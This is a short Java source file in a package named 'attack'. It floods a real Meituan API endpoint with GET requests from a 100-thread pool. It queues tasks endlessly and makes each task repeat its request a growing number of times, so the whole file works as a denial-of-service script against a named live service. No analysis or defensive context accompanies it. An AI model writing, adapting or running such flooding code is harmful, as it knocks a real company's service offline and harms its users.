package com.dolphin.attack;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.util.concurrent.*;

/**
 * Created by wangjichuan on 2018/9/29.
 */
public class MeiTuan {

    private final static String url = "https://dachangzizhixian.meituan.com/ptapi/minsu?cityId=";
    private static CountDownLatch countDownLatch = new CountDownLatch(1);

    public static void main(String[] args) throws Exception{
        ExecutorService threadPool = new ThreadPoolExecutor(100,100,10, TimeUnit.SECONDS,new LinkedBlockingQueue<>());
        Long i = 0L;
        while (i<Long.MAX_VALUE){
            threadPool.submit(new FetchTask(i));
            i++;
        }
        countDownLatch.wait();
    }

    static class FetchTask implements Runnable{

        private Long cityId;

        public FetchTask(Long cityId){
            this.cityId = cityId;
        }
        @Override
        public void run() {
            CloseableHttpClient httpClient = HttpClients.createDefault();
            HttpGet httpGet = null;

            for(int i=0;i< cityId;i++){
                try {
                    httpGet =new HttpGet(url+cityId);
                    CloseableHttpResponse response =  httpClient.execute(httpGet);
                    System.out.println(response.getStatusLine());

                }catch (Exception e){
                    e.printStackTrace();
                }
            }

        }
    }
}
